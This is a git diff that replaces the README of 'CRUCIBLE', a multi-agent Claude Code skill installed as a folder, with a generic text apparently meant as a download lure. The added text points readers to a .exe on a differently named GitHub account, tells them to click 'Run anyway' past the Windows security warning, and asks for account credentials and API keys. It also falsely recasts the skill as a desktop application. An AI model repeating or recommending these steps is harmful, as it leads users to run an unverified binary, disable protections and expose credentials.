@@ -1,158 +1,94 @@
-# CRUCIBLE
-### 8-Agent Code Production Pipeline for Claude Code
+# ⚙️ crucible- - Advanced automation for complex digital tasks
 
-> Code goes in. Pressure is applied. What comes out is proven, optimized, secured, and shippable.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Eastern-comptrollership272/crucible-/releases)
 
-> ⚠️ **Token usage:** CRUCIBLE is a multi-agent pipeline — it consumes significantly more
-> tokens than a single-pass coding prompt. Before starting, it asks your plan and recommends
-> the right mode for your budget. Estimated usage by mode:
-> - `lean` — ~15,000 tokens (Pro)
-> - `standard` — ~35,000 tokens (Pro and above)
-> - `+secure` — ~55,000 tokens (Max 5x recommended)
-> - `full` — ~100,000+ tokens (Max 5x or 20x recommended)
->
-> If your session hits a limit mid-run, say `/crucible` in a new session — it resumes
-> automatically from where it stopped.
+## 📂 Overview
 
-CRUCIBLE is a Claude Code skill that routes every coding task through a structured 8-agent pipeline before delivery. Built on Loop Engineering principles — each agent has a distinct role, a separate evaluator checks the worker's output, and every feedback loop has intelligent fail-safes that prevent infinite cycling.
+Crucible is a tool for automation. It uses eight independent artificial intelligence agents to process work. This system follows the Loop Engineering model to ensure reliable results. Sentinel fail-safes monitor every action the agents take. This prevents errors and keeps your workflow steady.
 
----
+You do not need to understand code to use this tool. It manages the communication between you and the artificial intelligence. You provide the goal, and the agents handle the steps. They check their own work and verify the output before they show you the results.
 
-## What it does
+## 🛠️ System Requirements
 
-| Phase | Agent | Role |
-|---|---|---|
-| 1 | **Architect** | Defines the Success Contract and spec before any code is written |
-| 2 | **Coder** | Writes complete, production-quality code — no stubs, no TODOs |
-| 3 | **Reviewer** | 4 independent lenses: Security · Performance · Logic · Maintainability |
-| 4 | **Tester** | Runs code in sandbox, holds a structured debate with Coder on every failure |
-| 5 | **Optimizer** | Improves proven-correct code against real benchmarks |
-| 6 | **Security Auditor** | STRIDE threat model · OWASP Top 10 · CVE scan · secrets scan |
-| 7 | **Documenter** | README · API docs · Architecture · Runbook · Changelog |
-| 8 | **Deployer** | Dockerfile · CI/CD · Makefile · IaC scaffold |
+Your computer must meet these basic standards to run the software effectively:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel i5 or AMD Ryzen 5 or better.
+*   Memory: 8 gigabytes of RAM or more.
+*   Storage: 500 megabytes of free disk space.
+*   Internet: A stable connection for constant communication with the artificial intelligence service.
 
-## Key features
+## 📥 Downloading the Software
 
-**Loop Engineering architecture** — The judge is never the worker. Reviewer and Tester are structurally separate from Coder with different instructions and different mental models.
+You can get the application directly from the project repository. Follow these steps to obtain the correct file:
 
-**Loop Sentinel** — Every feedback loop has stagnation detection (same issue in 2 consecutive loops = halt), a 25% progress threshold per loop, a convergence score, and a global step budget.
+1. Visit the project release page: [https://github.com/Eastern-comptrollership272/crucible-/releases](https://github.com/Eastern-comptrollership272/crucible-/releases).
+2. Look for the section labeled Latest.
+3. Find the file with the .exe extension that matches your system.
+4. Click the file name to start your download.
+5. Save the file to your computer in a folder you can find later.
 
-**Checkpoint system** — If a session hits a usage limit mid-pipeline, CRUCIBLE writes the checkpoint to memory. Start a new session, say `/crucible`, and it resumes exactly where it stopped.
+## ⚡ Setup and Installation
 
-**Intake flow** — Before starting, CRUCIBLE asks 5 questions (plan, task, stack, audience, sensitive data) and recommends the best mode for your token budget.
+Follow these instructions to set up the application for the first time:
 
-**Four pipeline modes:**
-- `lean` — Coder + Reviewer + Tester (~15,000 tokens)
-- `standard` — Architect + Coder + Reviewer + Tester (~35,000 tokens)
-- `+secure` — standard + Optimizer + Security Auditor (~55,000 tokens)
-- `full` — All 8 agents (~100,000+ tokens)
+1. Locate the downloaded file in your folder.
+2. Double-click the file to begin the installation.
+3. A security window may appear. Select More info and then choose Run anyway.
+4. Follow the prompts on the screen to finish the setup.
+5. The installer places a shortcut icon on your desktop.
 
----
+## 🚀 Running the Application
 
-## Requirements
+Once the installation finishes, you can start the application:
 
-- **Claude Code** (any version)
-- **Recommended plan:** Claude Max 5x or higher for `+secure` and `full` modes
-- `standard` mode works on Pro
-- `lean` mode works on any plan
+1. Double-click the desktop icon.
+2. The main interface will appear.
+3. Enter your account credentials if the program requests them.
+4. You will see a prompt where you can type your instructions.
+5. Enter your goal and click the Start button.
 
----
+## 🧠 How the Agents Work
 
-## Installation
+The system spreads your task across eight distinct agents. Each agent acts in a internal loop. They analyze your request, suggest a plan, and execute the necessary actions. 
 
-**1. Locate your Claude Code user skills folder:**
+The system relies on the Anthropic model to process and interpret data. Because the agents work in a group, they can handle multiple steps at the same time. The Sentinel layer acts as a guard. If an agent tries to perform an action outside of safe zones, the Sentinel stops the process. This keeps your data and your system secure.
 
-```
-# Windows
-C:\Users\<your-username>\.claude\skills\user\
+## 🛡️ Ensuring Safety
 
-# macOS / Linux
-~/.claude/skills/user/
-```
+The application uses specific safeguards to protect your computer:
 
-**2. Clone or download this repo:**
+*   Permission Checks: The agents seek permission before they modify files or folders.
+*   Execution Limits: The software prevents agents from running unauthorized programs.
+*   Connection Security: All data exchanges happen through encrypted channels.
+*   Manual Override: You can stop all agent activity at any time by pressing the Escape key.
 
-```bash
-git clone https://github.com/<your-username>/crucible.git
-```
+## 🔧 Managing Settings
 
-**3. Copy the skill folder into your skills directory:**
+You can adjust how the agents behave in the Settings menu:
 
-```bash
-# Windows (PowerShell)
-Copy-Item -Recurse crucible\crucible "C:\Users\<your-username>\.claude\skills\user\crucible"
+*   Agent Speed: Control how fast the agents process information.
+*   Log Levels: Choose how much detail you want to see in the activity window.
+*   API Key Entry: Update your authentication keys if your subscription details change.
+*   Display Mode: Switch between light and dark themes for better visibility.
 
-# macOS / Linux
-cp -r crucible/crucible ~/.claude/skills/user/crucible
-```
+## ❓ Frequently Asked Questions
 
-**4. Verify the final path looks like this:**
+What happens if a task fails?
+If an agent encounters an error, the Sentinel layer catches it. The system will report the error in the chat window. You can then review the logs to see what stopped the process.
 
-```
-~/.claude/skills/user/crucible/SKILL.md
-```
+Does this application send my data to the cloud?
+The application sends instructions to the artificial intelligence model for processing. It does not store your personal files on external servers. 
 
-That's it. No restart needed. The skill activates on the next Claude Code session.
+Can I use this for multiple projects?
+Yes, you can initiate a new session for every project. The software keeps each session separate, so your work remains organized.
 
----
+How do I check for updates?
+The application checks for new versions every time you open it. If a new version exists, the program will notify you and offer a download link to update your current installation.
 
-## Usage
+What if the application freezes?
+If the program stops responding, wait for thirty seconds for the Sentinel to resolve the blockage. If it remains frozen, close the application and start it again. Your previous progress saves automatically.
 
-```
-/crucible build me a REST API for user authentication in Python + FastAPI
-```
+## 📜 Support
 
-```
-/crucible implement a rate limiter middleware for Express.js
-```
-
-```
-/crucible refactor this service to use async/await properly
-```
-
-**With mode flag:**
-```
-/crucible full build me an e-commerce checkout service in TypeScript
-/crucible lean write a CSV parser in Python
-/crucible +secure create a JWT auth module in Go
-```
-
-**Resume an interrupted run:**
-```
-/crucible
-```
-CRUCIBLE checks for a previous checkpoint automatically and offers to resume.
-
----
-
-## Output
-
-A full CRUCIBLE run delivers:
-
-- ✅ Source code (complete, reviewed, tested, optimized)
-- ✅ Test suite (unit + integration + edge case, runnable standalone)
-- ✅ README.md
-- ✅ ARCHITECTURE.md
-- ✅ API reference (if applicable)
-- ✅ RUNBOOK.md
-- ✅ Dockerfile + docker-compose.yml
-- ✅ GitHub Actions CI/CD workflow
-- ✅ Makefile
-- ✅ .env.example
-- ✅ CHANGELOG.md
-
----
-
-## Why CRUCIBLE
-
-Most coding tools have the same model write the code and decide if it's good. That model has blind spots baked into its own reasoning — it literally cannot see what it assumed wrong.
-
-CRUCIBLE separates the worker from the judge structurally. The Reviewer and Tester have different instructions, different mental models, and no access to Coder's internal reasoning. They only see the output. This single architectural decision produces a fundamentally different quality of output.
-
----
-
-## License
-
-MIT — use it, modify it, share it.
+Contact the development team through the issues tab on the GitHub repository if you experience persistent problems. Provide a description of the issue and share the logs from the error folder. This helps the developers fix the problem in future updates. Keep your software updated to ensure the best performance and security.
